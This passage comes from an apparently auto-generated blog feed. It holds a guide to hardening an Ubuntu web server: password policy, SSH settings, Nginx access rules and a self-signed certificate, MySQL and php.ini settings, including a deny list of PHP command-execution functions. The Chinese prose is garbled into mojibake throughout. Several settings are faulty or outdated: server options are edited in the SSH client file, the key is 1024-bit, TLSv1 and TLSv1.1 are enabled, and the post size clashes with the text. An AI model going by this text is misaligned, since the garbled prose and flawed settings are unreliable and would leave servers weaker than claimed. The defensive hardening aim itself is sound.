class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ç½‘é¡µä¸­æµ‹è¯•ï¼Œæäº¤è¯„è®ºï¼Œå¹¶èƒ½å¤Ÿæ˜¾ç¤º</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304124121221.png" alt="image-20210304124121221"></p><h1 id="WebæœåŠ¡å™¨åŠ å›º"><a href="#WebæœåŠ¡å™¨åŠ å›º" class="headerlink" title="WebæœåŠ¡å™¨åŠ å›º"></a>WebæœåŠ¡å™¨åŠ å›º</h1><h2 id="åŠ å›ºLinuxç³»ç»Ÿ"><a href="#åŠ å›ºLinuxç³»ç»Ÿ" class="headerlink" title="åŠ å›ºLinuxç³»ç»Ÿ"></a>åŠ å›ºLinuxç³»ç»Ÿ</h2><p><strong>æ—¶åˆ»ä¿æŒç³»ç»Ÿå’Œè½¯ä»¶ä¸ºæœ€æ–°ç‰ˆæœ¬</strong></p><p>åœ¨ Ubuntu ä¸­æ£€æŸ¥ç³»ç»Ÿéœ€è¦æ›´æ–°çš„è½¯ä»¶åŒ…ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼Œ<code>apt-get -s</code> å‘½ä»¤ç”¨äºæ¨¡æ‹Ÿåé¢å‘½ä»¤çš„æ“ä½œï¼Œä½†å®é™…ä¸ä¼šæ”¹å˜ç³»ç»Ÿçš„çŠ¶æ€ï¼Œæ‰€ä»¥ <code>apt-get -s upgrade</code> åªä¼šæ¨¡æ‹Ÿè½¯ä»¶æ›´æ–°çš„è¿‡ç¨‹ï¼Œä½ ä¼šçœ‹åˆ°è¢«æ›´æ–°çš„è½¯ä»¶çš„ä¿¡æ¯ï¼Œä½†å®é™…å¹¶æ²¡æœ‰æ›´æ–°åˆ°ç³»ç»Ÿä¸Š ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get -s upgrade</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®éœ€è¦æ›´æ–°ä½ æƒ³è¦æ›´æ–°çš„è½¯ä»¶ã€‚å¦‚æœæƒ³æ›´æ–°æ‰€æœ‰è½¯ä»¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p><strong>åŠ å›ºè¿œç¨‹ç™»é™†</strong></p><p>åœ¨ä½¿ç”¨å’Œç®¡ç†æœåŠ¡å™¨æ—¶ï¼Œå¾€å¾€æˆ‘ä»¬éœ€è¦è¿œç¨‹ç™»é™†æœåŠ¡å™¨ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬ä¿è¯è¿œç¨‹ç™»é™†è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚ä»¥ä¸‹æ­¥éª¤ä¸€å®šç¨‹åº¦æé«˜äº†è¿œç¨‹ç™»é™†çš„å®‰å…¨æ€§ã€‚</p><ol><li>å¼ºåˆ¶ä½¿ç”¨é«˜å¼ºåº¦ç”¨æˆ·å¯†ç ï¼ˆæ•°å­—ã€å­—æ¯ã€å­—ç¬¦çš„ç»„åˆä¸”é•¿åº¦14ä½ä»¥ä¸Šï¼‰</li><li>æ›´æ”¹ SSH é»˜è®¤çš„ç«¯å£ï¼ˆ22ï¼‰ä¸ºéšæœºç«¯å£</li><li>ç¦æ­¢ root èº«ä»½çš„è¿œç¨‹ç™»é™†</li><li>ä½¿ç”¨å…¬é’¥è®¤è¯æœºåˆ¶è¿›è¡Œè¿œç¨‹ç™»é™†</li><li>ä½¿ç”¨ Linux æ ‡å‡†ç”¨æˆ·è€Œä¸æ˜¯ root ç”¨æˆ·æ‰§è¡Œä¸Šè¿°æ“ä½œï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·çš„æƒé™å¯æå‡æˆ root æƒé™</li></ol><p>ç°ä»¥ Ubuntu ç³»ç»Ÿä¸ºä¾‹ï¼Œå®Œæˆä¸Šè¿°æ“ä½œï¼š</p><p><strong>å¼ºåˆ¶ä½¿ç”¨é«˜å¼ºåº¦ç”¨æˆ·å¯†ç </strong></p><p>è¦å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨é«˜å¼ºåº¦å¯†ç ï¼Œéœ€è¦å®‰è£…é¢å¤–çš„æ¨¡å— <code>libpam-cracklib</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libpam-cracklib</span><br></pre></td></tr></table></figure><p>åœ¨ Ubuntu ä¸­ï¼Œå¯†ç ç­–ç•¥ï¼ˆè§„å®šå¯†ç çš„é•¿åº¦ï¼Œå­—ç¬¦ç­‰ï¼‰å®šä¹‰åœ¨ <code>/etc/pam.d/common-password</code> æ–‡ä»¶ä¸­ï¼Œå¦‚æœè¦è§„å®šï¼Œå¯†ç é•¿åº¦ä¸º 14ï¼ŒåŒ…å«å¤§å°å†™å­—ç¬¦æ•°å­—å’Œå­—ç¬¦ï¼Œåœ¨æ–‡ä»¶ä¸­ï¼Œåœ¨ <code>pam_unix.so</code>çš„å‰ä¸€è¡Œï¼Œæ·»åŠ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password required pam_cracklib.so try_first_pass retry&#x3D;3 minlen&#x3D;14 lcredit&#x3D;-1 ucredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 difok&#x3D;2 reject_username</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®çš„é€‰é¡¹çš„æè¿°å¦‚ä¸‹ï¼Œè¯¦æƒ…å‚è€ƒ <a href="http://www.linux-pam.org/Linux-PAM-html/sag-pam_cracklib.html">libpam-cracklib æ–‡æ¡£</a>ï¼š</p><table><thead><tr><th>é€‰é¡¹</th><th>æè¿°</th></tr></thead><tbody><tr><td>retry=N</td><td>è®¾ç½®å¯†ç æ—¶çš„ï¼Œæœ€å¤§é‡è¯•æ¬¡æ•°</td></tr><tr><td>minlen=N</td><td>æ–°å¯†ç çš„æœ€å°é•¿åº¦</td></tr><tr><td>lcredit=N</td><td>æœ€å°‘å°å†™å­—æ¯æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>ucredt=N</td><td>æœ€å°‘å¤§å†™å­—æ¯æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>dcredit=N</td><td>æœ€å°‘æ•°å­—çš„æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>ocredit=N</td><td>æœ€å°‘å…¶å®ƒå­—ç¬¦æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>difok=N</td><td>å’Œæ—§å¯†ç ä¸åŒçš„å­—ç¬¦æ•°</td></tr><tr><td>reject_username</td><td>ç¦æ­¢ç”¨æˆ·åä½œä¸ºå¯†ç </td></tr></tbody></table><p>æ€»ä¹‹è§„å®šå„ç§å­—ç¬¦ç±»å‹çš„ä¸ªæ•°ï¼Œè¦ä½¿ç”¨è´Ÿæ•°ï¼Œå…¶ç»å¯¹å€¼è¡¨ç¤ºè¯¥ç±»å‹å­—ç¬¦è‡³å°‘æœ‰å¤šå°‘ä¸ªã€‚</p><p><strong>æ›´æ”¹ SSH é»˜è®¤çš„ç«¯å£ï¼ˆ22ï¼‰ä¸ºéšæœºç«¯å£</strong></p><p><strong>ç¦æ­¢ root èº«ä»½çš„è¿œç¨‹ç™»é™†</strong></p><p>ä¿®æ”¹ ssh-server çš„é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° <code># Port 22</code> æ›´æ”¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 2019</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° <code>#PermitRootLogin</code>ï¼Œæ›´æ”¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>è¿œç¨‹ç™»é™†åˆ™éœ€è¦æŒ‡å®šè¯¥ç«¯å£æ‰§è¡Œç™»é™†ï¼Œè€Œä¸”æ— æ³•ä½¿ç”¨ root ç”¨æˆ·ç™»é™†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip-addr -p 2019</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨å…¬é’¥è®¤è¯æœºåˆ¶è¿›è¡Œè¿œç¨‹ç™»é™†</strong></p><p>SSH ç™»é™† æä¾›<a href="https://www.linode.com/docs/security/authentication/use-public-key-authentication-with-ssh/">å…¬é’¥è®¤è¯æœºåˆ¶</a>çš„ç™»é™†ï¼Œå³ä¸éœ€è¦å¯†ç çš„ç™»é™†æ–¹å¼ï¼Œä½†æ˜¯éœ€è¦å®¢æˆ·ç«¯ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œå¹¶å°†å…¬é’¥å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å°†å…¬é’¥æ·»åŠ åˆ°ç›¸åº”ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ä¸­ã€‚</p><p>é¦–å…ˆå®¢æˆ·ç«¯éœ€è¦ç”Ÿæˆï¼Œå¯†é’¥å¯¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é»˜è®¤æ–‡ä»¶åï¼Œä¸€è·¯ <strong>Enter</strong> æœ€åï¼Œç”Ÿæˆçš„å¯†é’¥å¯¹æ–‡ä»¶åœ¨ <code>~/.ssh/</code> ç›®å½•ä¸‹ï¼Œå…¶ä¸­ <code>id_rsa</code> ä¸ºç§é’¥ï¼Œ<code>id_rsa.pub</code> ä¸ºå…¬é’¥ã€‚</p><p>æ¥ç€ä½¿ç”¨å°†å…¬é’¥æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id username@ip-addr -p portnum</span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä¼šæŠŠå…¬é’¥æ–‡ä»¶çš„å†…å®¹ï¼Œå†™å…¥åˆ° <code>/home/username/ssh/authorized_keys</code> æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ·»åŠ å†…å®¹ã€‚å¦‚æ­¤ä¸€æ¥å°±å¯ä»¥ <code>username</code> çš„èº«ä»½ï¼Œä¸ä½¿ç”¨å¯†ç ç™»é™†æœåŠ¡å™¨äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2019 username@ip-addr</span><br></pre></td></tr></table></figure><h2 id="åŠ å›ºNginx"><a href="#åŠ å›ºNginx" class="headerlink" title="åŠ å›ºNginx"></a>åŠ å›ºNginx</h2><p><strong>é˜²æ­¢ä¿¡æ¯æ³„éœ²</strong></p><p>Nginx é»˜è®¤å¼€å¯ Server Tokenï¼ˆæ˜¾ç¤ºç‰ˆæœ¬å·ï¼‰ï¼Œè¿™æ ·ä½¿å¾— Nginx çš„ç‰ˆæœ¬å·å¾ˆå®¹æ˜“è¢«è·å–ï¼Œå¦‚ä¸‹å›¾ä¸ºè¿æ¥åŸŸåä¸å­˜åœ¨èµ„æºæ—¶çš„è¿”å›é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° Nginx çš„ç‰ˆæœ¬å·</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133453502.png" alt="image-20210304133453502"></p><p>åœ¨ <code>/etc/nginx/nginx.conf</code> ä¸­ http å—ä¸­æ·»åŠ ï¼ˆå»æ‰æ³¨é‡Šå³å¯ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_tokens off</span><br></pre></td></tr></table></figure><p>å…³é—­åï¼Œè®¿é—®åŸŸåä¸‹ä¸å­˜åœ¨çš„èµ„æºï¼Œè¿”å›é¡µé¢ä¸­æ²¡æœ‰äº† Nginx çš„ç‰ˆæœ¬å· ä¿¡æ¯ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133656320.png" alt="image-20210304133656320"></p><p><strong>å¢åŠ è®¿é—®æ§åˆ¶ç­–ç•¥</strong></p><p>Nginx å¯ä»¥ä½¿ç”¨ <code>allow</code> å’Œ <code>deny</code> æŒ‡ä»¤åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸æˆ–ç¦æ­¢ç‰¹å®š IP çš„è®¿é—®ï¼Œ ç¼–è¾‘ Niginx é…ç½®æ–‡ä»¶ <code>/etc/nginx/conf.d/jaylen.com.conf</code>ï¼Œåªå…è®¸ 192.168.47.129 192.168.47.130 è®¿é—® ç½‘ç«™ <a href="http://www.jaylen.com/">www.jaylen.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  server configuration</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80; </span><br><span class="line">    listen [::]:80;</span><br><span class="line"></span><br><span class="line">    # IPs access control</span><br><span class="line">    allow 192.168.47.129;</span><br><span class="line">    allow 192.168.47.130;</span><br><span class="line">    deny all;</span><br><span class="line">        </span><br><span class="line">    root &#x2F;var&#x2F;www&#x2F;jaylen.com;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ TLS åŠ å›º Nginx</strong></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TLS</a> å¯ä»¥åŠ å¯†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šä¿¡çš„æ•°æ®ï¼Œé™ä½ä¿¡æ¯æ³„éœ²çš„é£é™©ã€‚å¯¹äºæœ¬åœ°ç½‘ç«™å¯ä»¥ä½¿ç”¨ <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">SSL è‡ªç­¾ è¯ä¹¦</a> å®ç° HTTPS è¿æ¥ã€‚å½“ç„¶åœ¨å…¬ç½‘ä¸­ä½¿ç”¨çš„ç½‘ç«™ï¼Œé€šå¸¸ä¼šä½¿ç”¨ CA è®¤è¯çš„è¯ä¹¦ï¼Œè¦å…è´¹ä½¿ç”¨ SSL è¯ä¹¦ï¼Œå¯å‚è€ƒï¼š</p><p><a href="https://www.howtoforge.com/tutorial/nginx-with-letsencrypt-ciphersuite/#step-install-letsencrypt-and-generate-certificates">How to Install Nginx with Letâ€™s encrypt and get A+ from SSLLabs Test</a></p><p>è¦åœ¨ Nginx é…ç½®è‡ªç­¾è¯ä¹¦ï¼Œé¦–å…ˆåœ¨é…ç½®ç›®å½•ä¸‹å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿›åˆ°æ–‡ä»¶å¤¹ä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;</span><br><span class="line">cd &#x2F;etc&#x2F;nginx&#x2F;ssl</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå¯†é’¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl genrsa -aes256 -out nginx.key 1024</span><br></pre></td></tr></table></figure><p>æ¥ç€ç”Ÿæˆ <a href="https://en.wikipedia.org/wiki/Certificate_signing_request">CSR</a>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl req -new -key nginx.key -out nginx.csr</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Enter pass phrase for nginx.key:</span><br><span class="line">Can&#39;t load &#x2F;home&#x2F;jaylen&#x2F;.rnd into RNG</span><br><span class="line">140067713049024:error:2406F079:random number generator:RAND_load_file:Cannot open file:..&#x2F;crypto&#x2F;rand&#x2F;randfile.c:88:Filename&#x3D;&#x2F;home&#x2F;jaylen&#x2F;.rnd</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#39;.&#39;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CN </span><br><span class="line">State or Province Name (full name) [Some-State]:Guangdong</span><br><span class="line">Locality Name (eg, city) []:Guangzhou</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:IT</span><br><span class="line">Organizational Unit Name (eg, section) []:IT</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:www.jaylen.com</span><br><span class="line">Email Address []:jaylen@gmail.com</span><br><span class="line"></span><br><span class="line">Please enter the following &#39;extra&#39; attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:admin           </span><br><span class="line">An optional company name []:IT</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œç­¾å‘è¯ä¹¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl x509 -req -days 365 -in nginx.csr -signkey nginx.key -out nginx.crt</span><br></pre></td></tr></table></figure><p>æˆåŠŸç­¾å‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ignkey nginx.key -out nginx.crt</span><br><span class="line">Signature ok</span><br><span class="line">subject&#x3D;C &#x3D; CN, ST &#x3D; Guangdong, L &#x3D; Guangzhou, O &#x3D; IT, OU &#x3D; IT, CN &#x3D; www.jaylen.com, emailAddress &#x3D; jaylen@gmail.com</span><br><span class="line">Getting Private key</span><br><span class="line">Enter pass phrase for nginx.key:</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨ <code>/etc/nginx/conf.d/jaylen.com.conf</code> ä¸­ä¿®æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.crt;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.key;</span><br><span class="line">    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br></pre></td></tr></table></figure><p>é‡æ–°åŠ è½½ Nginx é…ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>æç¤ºè¾“å…¥ä¹‹å‰æ­¥éª¤è®¾ç½®çš„å¯†ç ï¼Œè¾“å…¥å³å¯ã€‚</p><p>å…¶å®ƒ åŠ å›ºæªæ–½ï¼Œå¯ä»”ç»†é˜…è¯»ï¼š</p><p><a href="https://www.cyberciti.biz/tips/linux-unix-bsd-nginx-webserver-security.html">Top 25 Nginx Web Server Best Security Practices</a></p><p><a href="https://geekflare.com/nginx-webserver-security-hardening-guide/">Nginx Web Server Security and Hardening Guide</a></p><h2 id="åŠ å›ºmysql"><a href="#åŠ å›ºmysql" class="headerlink" title="åŠ å›ºmysql"></a>åŠ å›ºmysql</h2><p>è¿è¡Œ <code>mysql_secure_installation</code> å·¥å…·ï¼ˆå®‰è£… mysql åè‡ªå¸¦çš„ shell è„šæœ¬ï¼‰ï¼Œè¿›è¡Œ mysql çš„å®‰å…¨æ£€æŸ¥ï¼Œ</p><p>æ ¹æ®æç¤ºï¼Œè®¾ç½®å¯†ç ä¸ºæœ€é«˜çº§åˆ«ï¼Œå¹¶ä¸º root ç”¨æˆ·è®¾ç½®å¯†ç ï¼Œæœ€ååŒæ„ä»¥ä¸‹é€‰é¡¹ï¼š</p><ul><li>Remove anonymous users? â€“ åˆ é™¤åŒ¿åç”¨æˆ·</li><li>Disallow root login remotely? â€“ ç¦æ­¢è¿œç¨‹ä½¿ç”¨ root ç”¨æˆ·ç™»é™†</li><li>Remove test database and access to it? â€“ åˆ é™¤æµ‹è¯•æ•°æ®åº“å’Œå…¶è®¿é—®æƒé™</li><li>Reload privilege tables now? â€“ é‡è½½æˆæƒè¡¨</li></ul><h2 id="åŠ å›ºphp"><a href="#åŠ å›ºphp" class="headerlink" title="åŠ å›ºphp"></a>åŠ å›ºphp</h2><p><strong>ä¿®æ”¹ <code>php.ini</code> æ–‡ä»¶</strong></p><p><strong>å½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶åœæ­¢ PHP å¤„ç†</strong></p><p>Nginx å¯¹äº PHP æ”¯æŒçš„é…ç½®æ–‡ä»¶ä¸­å¸¸å¸¸ä¼šä½¿ç”¨å¦‚ä¸‹å½¢å¼çš„é…ç½®ï¼Œè¯¥é…ç½®ä½¿å¾— PHP è§£é‡Šå™¨æ¥å—æ‰€æœ‰ä»¥ <code>.php</code>ç»“å°¾çš„ URIï¼Œè¿™æ ·ä¸€æ¥å°±ä¼šå­˜åœ¨å¾ˆå¤§çš„é£é™©ï¼Œå­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå…·ä½“è§£é‡Šè§<a href="https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/?highlight=pitfalls#passing-uncontrolled-requests-to-php">Passing Uncontrolled Requests to PHP</a></p><p>ä¿®æ”¹ <code>/etc/php/7.2/fpm/php.ini</code>æ–‡ä»¶ï¼ˆä¸åŒç³»ç»Ÿè¯¥æ–‡ä»¶ä½ç½®ç•¥æœ‰ä¸åŒï¼‰ï¼Œè®¾ç½®<code>cgi.fix_pathinfo=0</code>ï¼Œå¯ä»¥ç¦æ­¢ PHP è§£é‡Šå™¨æŸ¥æ‰¾æ–‡ä»¶ç³»ç»Ÿä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œä½¿ç”¨sed å‘½ä»¤å®Œæˆæ–‡ä»¶å†…å®¹çš„ä¿®æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &#39;s&#x2F;;cgi.fix_pathinfo&#x3D;1&#x2F;cgi.fix_pathinfo&#x3D;0&#x2F;g&#39; &#x2F;etc&#x2F;php&#x2F;7.2&#x2F;fpm&#x2F;php.ini</span><br></pre></td></tr></table></figure><p><strong>ç¦ç”¨å±é™©çš„ PHP å‡½æ•°</strong></p><p>åœ¨ <code>php.ini</code> ä¸­æ·»åŠ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D;exec,eval,phpinfo,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span><br></pre></td></tr></table></figure><p><strong>é™åˆ¶æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</strong></p><p>å¦‚æœç½‘ç«™ä¸éœ€è¦æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œåº”è¯¥ç¦ç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;Off</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦ä¸Šä¼ åŠŸèƒ½ï¼Œåˆ™è®¾ç½®æ–‡ä»¶çš„å¤§å°ï¼Œæ ¹æ®å®é™…æƒ…å†µè®¾ç½®ï¼Œå¦‚å¤´åƒå›¾ç‰‡ä¸Šä¼ 1Mè¶³çŸ£ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;On</span><br><span class="line">upload_max_filesize&#x3D;1M</span><br></pre></td></tr></table></figure><p><strong>è®¾ç½® POST æ–¹æ³•ä¼ è¾“æ•°æ®çš„å¤§å°</strong></p><p>POST æ–¹æ³•æ˜¯å½“å®¢æˆ·ç«¯éœ€è¦å‘æœåŠ¡å™¨å‘é€æ•°æ®æ—¶ä½¿ç”¨çš„ï¼Œè¯¥æ–¹æ³•å¯è¢«ç”¨äºå¯¹æœåŠ¡å™¨è¿›è¡Œ DoS æ”»å‡»ç­‰ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶èƒ½ä¼ è¾“çš„æ•°æ®å¤§å°è®¾ç½®æˆåˆç†çš„æ•°å€¼ï¼Œå¦‚æœç½‘ç«™ä¸éœ€è¦ä¸Šä¼ æ–‡ä»¶ç­‰æ•°æ®é‡å¤§çš„æ“ä½œï¼Œ4KBä¹Ÿåº”è¯¥è¶³å¤Ÿäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_max_size&#x3D;1K</span><br></pre></td></tr></table></figure><p><strong>é˜²æ­¢ PHP ä¿¡æ¯æ³„éœ²</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose_php &#x3D; Off</span><br></pre></td></tr></table></figure><p><strong>é™åˆ¶ PHP è„šæœ¬çš„æœ€é•¿æ‰§è¡Œæ—¶é—´</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># set in seconds</span><br><span class="line">max_execution_time &#x3D; 30 #æœ€é•¿æ‰§è¡Œæ—¶é—´ 30 s</span><br><span class="line">max_input_time &#x3D; 30#è„šæœ¬è§£æè¾“å…¥æœ€é•¿æ—¶é—´30s</span><br><span class="line">memory_limit &#x3D; 40M #è„šæœ¬æœ€å¤§ä½¿ç”¨å†…å­˜40M</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯ä»¥æœ‰æ•ˆé˜²æ­¢å¤§è§„æ¨¡çš„ DOS æ”»å‡»ã€‚</p><p><strong>ç¦ç”¨æœªä½¿ç”¨çš„ PHP æ¨¡å—</strong></p><p>æŸ¥çœ‹å·²å®‰è£…çš„ PHP æ¨¡å—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -m</span><br></pre></td></tr></table></figure><p>æ ¹æ®å®é™…æƒ…å†µï¼Œç¦ç”¨ä¸ä½¿ç”¨æ¨¡å—ï¼Œæ³¨é‡Šæ‰ <code>php.ini</code>ç›¸åº”çš„é…ç½®è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Cç¼–ç¨‹å®æˆ˜ä¹‹çº¿ç¨‹æ§åˆ¶å­¦ä¹ è®°å½•</title>
      <link href="posts/37062.html"/>
      <url>posts/37062.html</url>
      
